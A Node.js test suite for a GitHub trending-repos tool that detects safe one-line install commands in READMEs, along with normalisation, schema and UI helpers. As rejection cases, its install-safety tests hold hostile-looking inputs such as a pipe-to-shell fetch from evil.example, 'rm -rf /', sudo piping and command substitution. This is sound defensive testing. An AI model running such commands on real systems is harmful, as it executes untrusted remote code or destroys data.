// node --test scripts/test.mjs — no dependencies, no network.
import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, writeFileSync, existsSync, mkdirSync, readdirSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import {
  extractReadmeCandidates, manifestCandidates, assembleInstall, isSafeCommand, sectionScore,
  isRelated, registryTarget, applyRegistryVerdicts, isStandaloneInstaller, isSetuptoolsScript, dockerImage,
} from "./lib/install-detect.mjs";
import { normalizeRepo, keepItem, dedupeAndSort, buildQueries, pickDeltaBase, applyDeltas } from "./lib/normalize.mjs";
import { validateSnapshot } from "./lib/schema.mjs";
import { injectBase } from "./export-rawmware.mjs";
import {
  filterRepos, sortRepos, parseState, serializeState, pickDefaultWindow, matchesQuery, pickNewest,
  isAcceptableSnapshot, languageCounts,
} from "../dist/lib/filter.js";
import { compact, relativeTime, ageLabel, langColor } from "../dist/lib/format.js";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const FETCH = path.join(ROOT, "scripts/fetch-repos.mjs");
const SEED = path.join(ROOT, "scripts/fixtures/seed-search.json");

// §4.6 context
const ctx = { owner: "acme", repo: "rocket-cli", homepage: "https://rocket.dev", defaultBranch: "main", readmeFile: "README.md" };
const CLONE = "git clone --depth 1 https://github.com/acme/rocket-cli.git";
const md = (...lines) => lines.join("\n");
const fence = (...lines) => ["```sh", ...lines, "```"].join("\n");
const detect = (readme, files = {}, extra = {}) => {
  const c = { ...ctx, ...extra };
  return assembleInstall(extractReadmeCandidates(readme, c), manifestCandidates(files, c), c);
};

describe("§4.6 install-detection vectors", () => {
  test("1: brew from an Installation section", () => {
    const inst = detect(md("# rocket", "", "## Installation", "", fence("$ brew install acme/tap/rocket-cli")));
    assert.equal(inst.primary.method, "brew");
    assert.equal(inst.primary.command, "brew install acme/tap/rocket-cli");
    assert.equal(inst.primary.confidence, "readme");
    assert.equal(inst.primary.source, "README.md · Installation");
    assert.equal(inst.primary.platform, "macos-linux");
  });

  test("2: prerequisite npm i -g pnpm is rejected by the relation check", () => {
    const cands = extractReadmeCandidates(md("## Install", fence("npm i -g pnpm", "npm i -g rocket-cli")), ctx);
    assert.deepEqual(cands.map((c) => c.command), ["npm i -g rocket-cli"]);
    const inst = assembleInstall(cands, [], ctx);
    assert.equal(inst.primary.method, "npm-global");
    assert.equal(inst.primary.command, "npm i -g rocket-cli");
    assert.equal(isRelated("npm-global", "npm i -g pnpm", ctx), false);
  });

  test("3: curl | bash from the homepage host, with a warning note", () => {
    const inst = detect(md("## Quick start", fence("curl -fsSL https://rocket.dev/install.sh | bash")));
    assert.equal(inst.primary.method, "curl-sh");
    assert.equal(inst.primary.command, "curl -fsSL https://rocket.dev/install.sh | bash");
    assert.match(inst.primary.note, /read it first/i);
  });

  test("4: curl from an unrelated host is rejected and falls through", () => {
    const inst = detect(md("## Install", fence("curl -fsSL https://evil.example/x.sh | bash")));
    assert.equal(inst.primary.method, "clone");
    assert.equal(inst.primary.confidence, "fallback");
  });

  test("5: sudo is rejected", () => {
    assert.equal(isSafeCommand("curl https://rocket.dev/i.sh | sudo bash"), false);
    const inst = detect(md("## Install", fence("curl https://rocket.dev/i.sh | sudo bash")));
    assert.equal(inst.primary.confidence, "fallback");
  });

  test("6: && chains are rejected", () => {
    assert.equal(isSafeCommand("npm i -g rocket-cli && rocket init"), false);
    const inst = detect(md("## Install", fence("npm i -g rocket-cli && rocket init")));
    assert.equal(inst.primary.confidence, "fallback");
  });

  test("7: build-from-source sections are excluded", () => {
    assert.equal(sectionScore("Building from source"), -1);
    assert.equal(sectionScore("Build from source"), -1);
    assert.deepEqual(extractReadmeCandidates(md("## Building from source", fence("cargo install --path .")), ctx), []);
    // even a command that would otherwise be accepted
    assert.deepEqual(extractReadmeCandidates(md("## Building from source", fence("cargo install rocket-cli")), ctx), []);
  });

  test("8: package.json bin, npm not verified -> github: install", () => {
    const files = { "package.json": JSON.stringify({ name: "rocket-cli", bin: { rocket: "x.js" } }) };
    const inst = detect("", files, { npmVerified: false });
    assert.equal(inst.primary.method, "npm-global");
    assert.equal(inst.primary.command, "npm install -g github:acme/rocket-cli");
    assert.equal(inst.primary.confidence, "manifest");
    assert.equal(inst.primary.source, "package.json");
    assert.equal(inst.primary.note, "Installs straight from GitHub (not published to npm).");
    assert.ok(isSafeCommand(inst.primary.command));
  });

  test("8b: package.json bin, npm verified -> npm install -g <name>", () => {
    const files = { "package.json": JSON.stringify({ name: "rocket-cli", bin: "x.js" }) };
    assert.equal(detect("", files, { npmVerified: true }).primary.command, "npm install -g rocket-cli");
    const lib = { "package.json": JSON.stringify({ name: "rocket-lib", main: "x.js" }) };
    assert.equal(detect("", lib).primary.confidence, "fallback");
  });

  test("9: pyproject with scripts, PyPI not verified -> pipx git+, alternate uv tool", () => {
    const files = { "pyproject.toml": md("[project]", 'name = "rocket-cli"', "", "[project.scripts]", 'rocket = "rocket:main"') };
    const inst = detect("", files, { pypiVerified: false });
    assert.equal(inst.primary.method, "pipx");
    assert.equal(inst.primary.command, "pipx install git+https://github.com/acme/rocket-cli.git");
    assert.ok(inst.alternates.some((a) => a.method === "uv-tool" && a.command === "uv tool install git+https://github.com/acme/rocket-cli.git"));
  });

  test("10: go.mod + main.go -> go install", () => {
    const files = { "go.mod": "module github.com/acme/rocket-cli\n\ngo 1.22\n", "main.go": "package main\n" };
    const inst = detect("", files);
    assert.equal(inst.primary.method, "go");
    assert.equal(inst.primary.command, "go install github.com/acme/rocket-cli@latest");
  });

  test("11: nothing found -> clone fallback", () => {
    const inst = detect("# rocket\n\nJust a readme.", {});
    assert.equal(inst.primary.method, "clone");
    assert.equal(inst.primary.confidence, "fallback");
    assert.equal(inst.primary.source, null);
    assert.equal(inst.primary.note, "No one-line installer found — follow the README.");
    assert.equal(inst.clone, CLONE);
    assert.equal(inst.primary.command, CLONE);
    assert.deepEqual(inst.alternates, []);
  });

  test("12: brew (Install) beats npx (Usage); npx is an alternate", () => {
    const inst = detect(md("## Install", fence("brew install rocket-cli"), "", "## Usage", fence("npx rocket-cli init")));
    assert.equal(inst.primary.method, "brew");
    assert.equal(inst.primary.command, "brew install rocket-cli");
    assert.ok(inst.alternates.some((a) => a.method === "npx" && a.command === "npx rocket-cli init"));
  });

  test("13: isSafeCommand rejects long, multi-line, redirect and backtick input", () => {
    assert.equal(isSafeCommand(`npm i -g ${"a".repeat(201 - 9)}`), false);
    assert.equal(`npm i -g ${"a".repeat(201 - 9)}`.length, 201);
    assert.equal(isSafeCommand("a\nb"), false);
    assert.equal(isSafeCommand("pip install x>=1"), false);
    assert.equal(isSafeCommand("echo `id`"), false);
  });
});

describe("install detection: details and refinements", () => {
  test("isSafeCommand accepts each method shape and rejects others", () => {
    for (const ok of [
      "brew install --cask acme/tap/rocket", "npm install -g @acme/rocket@1.2.0", "pnpm add -g rocket-cli",
      "npx -y rocket-cli init my-app", "uv tool install rocket-cli", "uvx rocket-cli --help", "pipx install rocket-cli",
      "pip install rocket-cli[all]", "python3 -m pip install -U rocket-cli", "cargo install --locked rocket-cli",
      "go install github.com/acme/rocket-cli/cmd/rocket@latest", "irm https://rocket.dev/install.ps1 | iex",
      "docker run -p 8080:8080 ghcr.io/acme/rocket:latest", "npm install -g github:acme/rocket-cli",
    ]) assert.equal(isSafeCommand(ok), true, ok);
    for (const bad of [
      "curl http://rocket.dev/i.sh | sh", "curl -fsSL https://x.dev/a | sh | sh", "pip install -r requirements.txt",
      "git clone https://github.com/acme/rocket-cli", "npm install", "npm i -g YOUR_PACKAGE", "rm -rf /",
      "npx rocket-cli $(whoami)", "docker run -it ubuntu bash -c a b c",
    ]) assert.equal(isSafeCommand(bad), false, bad);
    assert.equal(isSafeCommand(CLONE), false);
    assert.equal(isSafeCommand(CLONE, { allowClone: true }), true);
  });

  test("relation check rules a–e", () => {
    assert.ok(isRelated("npx", "npx skills add acme/rocket-cli", ctx)); // (a)
    assert.ok(isRelated("pip", "pip install rocket_cli", ctx)); // (b)
    assert.ok(isRelated("brew", "brew install rocket", { ...ctx, manifestNames: ["rocket"] })); // (b) manifest
    assert.ok(isRelated("npm-global", "npm i -g @acme/rocket-cli-pro", ctx)); // (c)
    assert.ok(isRelated("curl-sh", "curl -fsSL https://get.rocket.dev/i.sh | sh", ctx)); // (d) subdomain
    assert.ok(isRelated("curl-sh", "curl -fsSL https://raw.githubusercontent.com/acme/rocket-cli/main/i.sh | sh", ctx)); // (d)
    assert.ok(isRelated("docker", "docker run ghcr.io/acme/server", ctx)); // (e)
    assert.equal(isRelated("npm-global", "npm i -g typescript", ctx), false);
  });

  test("docker: bare local image names are not accepted (needs a namespace)", () => {
    assert.equal(dockerImage("docker run -d --name x -p 1:1 rocketcli"), "rocketcli");
    assert.equal(isRelated("docker", "docker run -d -p 1:1 rocketcli", ctx), false);
    assert.ok(isRelated("docker", "docker run -d -p 1:1 acme/rocketcli", ctx));
  });

  test("inline code in a warning sentence is skipped", () => {
    const readme = md("## Install", "Do not shorten this to `npx rocket-cli`: that name is unrelated.", "Or use `brew install rocket-cli`.");
    assert.deepEqual(extractReadmeCandidates(readme, ctx).map((c) => c.command), ["brew install rocket-cli"]);
  });

  test("sub-headings inherit a positive parent score; CJK install headings count", () => {
    const readme = md("# rocket", "## Install", "### 1. Homebrew", fence("brew install rocket-cli"), "## Usage", fence("npx rocket-cli init"));
    const c = extractReadmeCandidates(readme, ctx);
    assert.equal(c[0].command, "brew install rocket-cli");
    assert.equal(c[0].source, "README.md · 1. Homebrew");
    assert.equal(sectionScore("インストール"), 3);
    assert.equal(sectionScore("安装"), 3);
    const dev = md("# rocket", "## Development", "### Setup", fence("npm i -g rocket-cli"));
    assert.deepEqual(extractReadmeCandidates(dev, ctx), []);
  });

  test("package-installer variants collapse to one candidate", () => {
    const readme = md("## Install", fence("npm i -g rocket-cli", "npm install --global rocket-cli@latest"));
    assert.deepEqual(extractReadmeCandidates(readme, ctx).map((c) => c.command), ["npm i -g rocket-cli"]);
  });

  test("registry guard drops name-only npm/PyPI commands owned elsewhere", () => {
    const cands = extractReadmeCandidates(md("## Install", fence("npx rocket-cli", "npx skills add acme/rocket-cli")), ctx);
    assert.deepEqual(registryTarget(cands[0], ctx), { registry: "npm", name: "rocket-cli" });
    assert.equal(registryTarget(cands[1], ctx), null);
    const kept = applyRegistryVerdicts(cands, { "npm:rocket-cli": "bad" }, ctx);
    assert.deepEqual(kept.map((c) => c.command), ["npx skills add acme/rocket-cli"]);
    assert.equal(applyRegistryVerdicts(cands, { "npm:rocket-cli": "unknown" }, ctx).length, 2);
  });

  test("manifest guards: repo-local install.sh, setup scripts, missing bin, tool-only pyproject", () => {
    assert.equal(isStandaloneInstaller('cd "$(dirname "$0")"\npip install -r requirements.txt\n'), false);
    assert.equal(isStandaloneInstaller('set -e\ncurl -fsSL "https://github.com/acme/rocket-cli/releases/download/v1/rocket" -o "$HOME/.local/bin/rocket"\n'), true);
    assert.equal(detect("", { "install.sh": 'cd "$(dirname "$0")"\nnpm install\n' }).primary.confidence, "fallback");
    assert.equal(
      detect("", { "install.sh": "curl -fsSL https://example.com/rocket -o /tmp/rocket\n" }).primary.command,
      "curl -fsSL https://raw.githubusercontent.com/acme/rocket-cli/main/install.sh | sh",
    );
    assert.equal(isSetuptoolsScript('"""one-click setup"""\nimport os\nmain()\n'), false);
    assert.equal(isSetuptoolsScript("from setuptools import setup\nsetup(name='rocket')\n"), true);
    assert.equal(detect("", { "setup.py": "import os\nprint('setup')\n" }).primary.confidence, "fallback");
    const pkg = JSON.stringify({ name: "rocket-cli", bin: { rocket: "dist/cli.js" } });
    assert.equal(detect("", { "package.json": pkg }, { npmBinPresent: false }).primary.confidence, "fallback");
    const prep = JSON.stringify({ name: "rocket-cli", bin: { rocket: "dist/cli.js" }, scripts: { prepare: "tsc" } });
    assert.equal(detect("", { "package.json": prep }, { npmBinPresent: false }).primary.method, "npm-global");
    assert.equal(detect("", { "pyproject.toml": "[tool.ruff]\nline-length = 100\n" }).primary.confidence, "fallback");
  });

  test("alternates: max 3, distinct, none equal to primary; Dockerfile -> docker build", () => {
    const readme = md("## Install", fence("brew install rocket-cli", "npm i -g rocket-cli", "pipx install rocket-cli", "cargo install rocket-cli", "uvx rocket-cli"));
    const inst = detect(readme, { Dockerfile: "FROM alpine\n" });
    assert.equal(inst.alternates.length, 3);
    const cmds = [inst.primary.command, ...inst.alternates.map((a) => a.command)];
    assert.equal(new Set(cmds).size, cmds.length);
    const d = detect("", { Dockerfile: "FROM alpine\n" });
    assert.equal(d.primary.command, "docker build -t rocketcli https://github.com/acme/rocket-cli.git#main");
    assert.equal(d.primary.method, "docker-build");
  });
});

// ---------- normalise ----------

const seedItem = {
  full_name: "acme/rocket-cli", name: "rocket-cli", description: "  A   fast rocket\nlauncher CLI  ",
  homepage: "", language: "Rust", stargazers_count: 1000, forks_count: 10, open_issues_count: 2,
  created_at: "2026-09-29T05:00:00Z", pushed_at: "2026-10-02T00:00:00Z", topics: null, default_branch: "main",
  license: "MIT", owner: { login: "acme", avatar_url: "https://avatars.githubusercontent.com/u/1?v=4" }, archived: false, fork: false,
};

describe("normalize", () => {
  test("normalizeRepo on a seed item", () => {
    const r = normalizeRepo(seedItem, { snapshotAt: "2026-10-03T05:00:00.000Z" });
    assert.deepEqual(r.topics, []);
    assert.equal(r.license, "MIT");
    assert.equal(r.homepage, null);
    assert.equal(r.description, "A fast rocket launcher CLI");
    assert.equal(r.ageDays, 4);
    assert.equal(r.starsPerDay, 250);
    assert.deepEqual(r.windows, ["7d", "30d"]);
    assert.equal(r.url, "https://github.com/acme/rocket-cli");
    assert.equal(r.starsDelta1d, null);
    const lic = normalizeRepo({ ...seedItem, license: { spdx_id: "NOASSERTION" } }, { snapshotAt: "2026-10-03T05:00:00Z" });
    assert.equal(lic.license, null);
    const young = normalizeRepo({ ...seedItem, created_at: "2026-10-03T00:00:00Z" }, { snapshotAt: "2026-10-03T05:00:00Z" });
    assert.deepEqual(young.windows, ["24h", "7d", "30d"]);
    assert.equal(young.starsPerDay, 1000);
  });

  test("spam filter drops robux generators and keeps normal repos", () => {
    assert.equal(keepItem({ ...seedItem, description: "Free Robux generator 2026" }), false);
    assert.equal(keepItem(seedItem), true);
    assert.equal(keepItem({ ...seedItem, description: "short" }), false);
    assert.equal(keepItem({ ...seedItem, fork: true }), false);
    assert.equal(keepItem({ ...seedItem, topics: ["aimbot"] }), false);
  });

  test("dedupe is case-insensitive and keeps the first", () => {
    const out = dedupeAndSort([seedItem, { ...seedItem, full_name: "ACME/Rocket-CLI", stargazers_count: 5 }]);
    assert.equal(out.length, 1);
    assert.equal(out[0].stargazers_count, 1000);
  });

  test("live queries match §4.2", () => {
    const q = buildQueries("2026-10-03T06:17:10.000Z");
    assert.equal(q[0].q, "created:>=2026-10-02T06:17:10Z stars:>=5 fork:false archived:false mirror:false is:public");
    assert.equal(q[1].q, "created:>=2026-09-26 stars:>=25 fork:false archived:false mirror:false is:public");
    assert.equal(q[2].q, "created:>=2026-09-03 stars:>=100 fork:false archived:false mirror:false is:public");
    assert.deepEqual(q.map((x) => x.perPage), [50, 100, 100]);
  });

  test("starsDelta1d uses the newest history file 18–30 h old", () => {
    const hist = [
      { snapshotAt: "2026-10-02T05:00:00Z", repos: [{ fullName: "acme/rocket-cli", stars: 900 }] },
      { snapshotAt: "2026-10-01T05:00:00Z", repos: [{ fullName: "acme/rocket-cli", stars: 100 }] },
      { snapshotAt: "2026-10-03T01:00:00Z", repos: [{ fullName: "acme/rocket-cli", stars: 990 }] },
    ];
    const base = pickDeltaBase(hist, "2026-10-03T05:00:00Z");
    assert.equal(base.snapshotAt, "2026-10-02T05:00:00Z");
    const repos = applyDeltas([normalizeRepo(seedItem, { snapshotAt: "2026-10-03T05:00:00Z" })], base);
    assert.equal(repos[0].starsDelta1d, 100);
    assert.equal(pickDeltaBase([], "2026-10-03T05:00:00Z"), null);
  });
});

// ---------- schema ----------

function minimalSnapshot() {
  const repo = normalizeRepo(seedItem, { snapshotAt: "2026-10-03T05:00:00Z" });
  repo.install = assembleInstall([], [], { owner: "acme", repo: "rocket-cli" });
  return {
    schemaVersion: 1,
    generatedAt: "2026-10-03T05:00:00.000Z",
    snapshotAt: "2026-10-03T05:00:00.000Z",
    source: { mode: "seed", api: "https://api.github.com/search/repositories", queries: [], warnings: [] },
    windows: [{ id: "24h", label: "Last 24 hours", hours: 24 }, { id: "7d", label: "Last 7 days", hours: 168 }, { id: "30d", label: "Last 30 days", hours: 720 }],
    stats: { total: 1, withOneLiner: 0, languages: 1, byMethod: { clone: 1 } },
    repos: [repo],
  };
}

describe("validateSnapshot", () => {
  test("accepts a minimal valid snapshot", () => {
    const v = validateSnapshot(minimalSnapshot());
    assert.deepEqual(v.errors, []);
    assert.equal(v.ok, true);
  });
  test("rejects duplicate fullNames", () => {
    const s = minimalSnapshot();
    s.repos.push(structuredClone(s.repos[0]));
    s.stats = { total: 2, withOneLiner: 0, languages: 1, byMethod: { clone: 2 } };
    assert.equal(validateSnapshot(s).ok, false);
    assert.ok(validateSnapshot(s).errors.some((e) => /duplicate fullName/.test(e)));
  });
  test("rejects a bad avatar host", () => {
    const s = minimalSnapshot();
    s.repos[0].avatarUrl = "https://evil.example/a.png";
    assert.ok(validateSnapshot(s).errors.some((e) => /avatarUrl/.test(e)));
  });
  test("rejects an unsafe command", () => {
    const s = minimalSnapshot();
    s.repos[0].install.primary = { method: "curl-sh", family: "shell", label: "install script", command: "curl -fsSL https://x.dev/i.sh | sudo sh", confidence: "readme", source: "README.md", platform: "macos-linux", note: null };
    s.stats = { total: 1, withOneLiner: 1, languages: 1, byMethod: { "curl-sh": 1 } };
    assert.ok(validateSnapshot(s).errors.some((e) => /unsafe command/.test(e)));
  });
  test("rejects a wrong clone string", () => {
    const s = minimalSnapshot();
    s.repos[0].install.clone = "git clone https://github.com/acme/rocket-cli";
    assert.ok(validateSnapshot(s).errors.some((e) => /clone/.test(e)));
  });
  test("rejects stats that disagree with repos", () => {
    const s = minimalSnapshot();
    s.stats.total = 9;
    assert.equal(validateSnapshot(s).ok, false);
  });
});

// ---------- UI pure modules ----------

const uiRepo = (fullName, o = {}) => ({
  fullName, description: "", topics: [], language: "Go", stars: 10, starsPerDay: 1, starsDelta1d: null,
  createdAt: "2026-09-30T00:00:00Z", windows: ["7d", "30d"],
  install: { primary: { family: "git", confidence: "fallback" } }, ...o,
});
const UI = [
  uiRepo("a/one", { stars: 50, language: "Rust", starsPerDay: 5, starsDelta1d: 3, topics: ["cli"], install: { primary: { family: "rust", confidence: "readme" } } }),
  uiRepo("b/two", { stars: 80, description: "A Fast TUI", starsPerDay: 2, createdAt: "2026-10-02T00:00:00Z", windows: ["24h", "7d", "30d"] }),
  uiRepo("c/three", { stars: 20, language: "Rust", starsPerDay: 9, starsDelta1d: 10, windows: ["30d"], install: { primary: { family: "node", confidence: "manifest" } } }),
];

describe("dist/lib/filter.js", () => {
  test("window, language, family and query filters", () => {
    assert.deepEqual(filterRepos(UI, { w: "24h", lang: "", m: "all", q: "" }).map((r) => r.fullName), ["b/two"]);
    assert.deepEqual(filterRepos(UI, { w: "all", lang: "Rust", m: "all", q: "" }).map((r) => r.fullName), ["a/one", "c/three"]);
    assert.deepEqual(filterRepos(UI, { w: "all", lang: "", m: "node", q: "" }).map((r) => r.fullName), ["c/three"]);
    assert.deepEqual(filterRepos(UI, { w: "all", lang: "", m: "oneliner", q: "" }).map((r) => r.fullName), ["a/one", "c/three"]);
    assert.deepEqual(filterRepos(UI, { w: "all", lang: "", m: "git", q: "" }).map((r) => r.fullName), ["b/two"]);
    assert.deepEqual(filterRepos(UI, { w: "all", lang: "", m: "all", q: "fast tui" }).map((r) => r.fullName), ["b/two"]);
    assert.ok(matchesQuery(UI[0], "CLI"));
    assert.ok(matchesQuery(UI[0], "a/on"));
  });
  test("sorts, including nulls last for gained-today", () => {
    assert.deepEqual(sortRepos(UI, "stars").map((r) => r.fullName), ["b/two", "a/one", "c/three"]);
    assert.deepEqual(sortRepos(UI, "newest").map((r) => r.fullName), ["b/two", "a/one", "c/three"]);
    assert.deepEqual(sortRepos(UI, "velocity").map((r) => r.fullName), ["c/three", "a/one", "b/two"]);
    assert.deepEqual(sortRepos(UI, "gained").map((r) => r.fullName), ["c/three", "a/one", "b/two"]);
  });
  test("URL state round-trips and rejects junk", () => {
    const s = { w: "30d", lang: "Rust", m: "python", q: "agent cli", sort: "velocity" };
    assert.deepEqual(parseState(serializeState(s)), s);
    assert.deepEqual(parseState("?w=nope&m=evil&sort=zzz", { defaultWindow: "30d" }), { w: "30d", lang: "", m: "all", q: "", sort: "stars" });
    assert.equal(parseState("?sort=gained", { gainedAvailable: false }).sort, "stars");
    assert.equal(parseState("?lang=Cobol", { languages: ["Rust"] }).lang, "");
  });
  test("default window falls back from 7d to 30d to all", () => {
    assert.equal(pickDefaultWindow(UI), "7d");
    assert.equal(pickDefaultWindow([uiRepo("x/y", { windows: ["30d"] })]), "30d");
    assert.equal(pickDefaultWindow([uiRepo("x/y", { windows: [] })]), "all");
  });
  test("remote mirror: the snapshot with the later generatedAt wins", () => {
    const a = { schemaVersion: 1, repos: [], generatedAt: "2026-10-03T06:00:00Z" };
    const b = { schemaVersion: 1, repos: [], generatedAt: "2026-10-04T06:00:00Z" };
    assert.equal(pickNewest(a, b), b);
    assert.equal(pickNewest(b, a), b);
    assert.equal(pickNewest(null, a), a);
    assert.equal(pickNewest(null, null), null);
    assert.equal(isAcceptableSnapshot(a), true);
    assert.equal(isAcceptableSnapshot({ schemaVersion: 2, repos: [], generatedAt: a.generatedAt }), false);
    assert.equal(isAcceptableSnapshot({ schemaVersion: 1, repos: [], generatedAt: "nope" }), false);
  });
  test("language counts sort by count desc", () => {
    assert.deepEqual(languageCounts(UI), [{ language: "Rust", count: 2 }, { language: "Go", count: 1 }]);
  });
});

describe("dist/lib/format.js", () => {
  test("compact numbers", () => {
    assert.match(compact(7341), /^7\.3K$/i);
    assert.equal(compact(7341), new Intl.NumberFormat("en-US", { notation: "compact", maximumFractionDigits: 1 }).format(7341));
  });
  test("relative time for 3 h and 2 d", () => {
    const now = Date.parse("2026-10-03T12:00:00Z");
    assert.equal(relativeTime("2026-10-03T09:00:00Z", now), "3 hours ago");
    assert.equal(relativeTime("2026-10-01T12:00:00Z", now), "2 days ago");
  });
  test("age labels and colours", () => {
    assert.equal(ageLabel(12.71), "12d old");
    assert.equal(ageLabel(5 / 24), "5h old");
    assert.equal(langColor("Rust"), "#dea584");
    assert.match(langColor("Brainfuck"), /^hsl\(\d+ 45% 60%\)$/);
  });
});

describe("export-rawmware injectBase", () => {
  test("inserts <base> right after the charset meta, exactly once", () => {
    const html = '<!doctype html>\n<html>\n<head>\n<meta charset="utf-8">\n<title>x</title>\n</head>\n</html>\n';
    const out = injectBase(html, "/365-days/projects/day-005/");
    assert.ok(out.includes('<meta charset="utf-8">\n<base href="/365-days/projects/day-005/">\n<title>'));
    assert.equal(out.match(/<base /g).length, 1);
    assert.equal(injectBase(out, "/365-days/projects/day-005/").match(/<base /g).length, 1);
    assert.throws(() => injectBase("<html></html>", "/x/"));
    const real = readFileSync(path.join(ROOT, "dist/index.html"), "utf8");
    assert.equal(injectBase(real, "/365-days/projects/day-005/").match(/<base /g).length, 1);
  });
});

// ---------- updater integration (no network) ----------

const runFetch = (args) => spawnSync(process.execPath, [FETCH, ...args], { encoding: "utf8", cwd: ROOT, env: { ...process.env, GITHUB_TOKEN: "" } });

describe("fetch-repos.mjs integration", () => {
  test("seed + --no-probe writes a valid snapshot and history", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "gf-"));
    try {
      const out = path.join(dir, "repos.json");
      const r = runFetch(["--seed", SEED, "--no-probe", "--out", out, "--now", "2026-10-03T05:00:00Z"]);
      assert.equal(r.status, 0, r.stderr + r.stdout);
      const snap = JSON.parse(readFileSync(out, "utf8"));
      const v = validateSnapshot(snap);
      assert.deepEqual(v.errors, []);
      assert.ok(snap.repos.length >= 20);
      assert.equal(snap.source.mode, "seed");
      assert.equal(snap.source.queries[0].window, "seed");
      assert.equal(snap.generatedAt, "2026-10-03T05:00:00.000Z");
      assert.ok(snap.repos.every((x) => x.install.primary.confidence === "fallback"));
      assert.ok(existsSync(path.join(dir, "history", "2026-10-03.json")));
      assert.ok(!existsSync(`${out}.tmp`));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("history is pruned to the newest 30 files", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "gf-"));
    try {
      const hist = path.join(dir, "history");
      mkdirSync(hist);
      for (let d = 1; d <= 35; d++) {
        const day = new Date(Date.UTC(2026, 7, d)).toISOString().slice(0, 10);
        writeFileSync(path.join(hist, `${day}.json`), JSON.stringify({ snapshotAt: `${day}T05:00:00Z`, repos: [] }));
      }
      const r = runFetch(["--seed", SEED, "--no-probe", "--out", path.join(dir, "repos.json")]);
      assert.equal(r.status, 0, r.stderr);
      const files = readdirSync(hist).sort();
      assert.equal(files.length, 30);
      assert.equal(files[files.length - 1], "2026-10-03.json");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("failures exit 1 and leave the existing file byte-identical; bad args exit 2", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "gf-"));
    try {
      const out = path.join(dir, "repos.json");
      writeFileSync(out, "SENTINEL");
      const missing = runFetch(["--seed", path.join(dir, "nope.json"), "--no-probe", "--out", out]);
      assert.equal(missing.status, 1);
      const few = path.join(dir, "few.json");
      const seed = JSON.parse(readFileSync(SEED, "utf8"));
      writeFileSync(few, JSON.stringify({ ...seed, items: seed.items.slice(0, 10) }));
      const tooFew = runFetch(["--seed", few, "--no-probe", "--out", out]);
      assert.equal(tooFew.status, 1);
      assert.equal(readFileSync(out, "utf8"), "SENTINEL");
      assert.ok(!existsSync(path.join(dir, "history")));
      assert.equal(runFetch(["--bogus"]).status, 2);
      assert.equal(runFetch(["--limit", "abc", "--seed", SEED]).status, 2);
      assert.equal(runFetch(["--now", "not-a-date", "--seed", SEED]).status, 2);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("--dry-run writes nothing", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "gf-"));
    try {
      const out = path.join(dir, "repos.json");
      const r = runFetch(["--seed", SEED, "--no-probe", "--dry-run", "--out", out]);
      assert.equal(r.status, 0, r.stderr);
      assert.ok(!existsSync(out));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
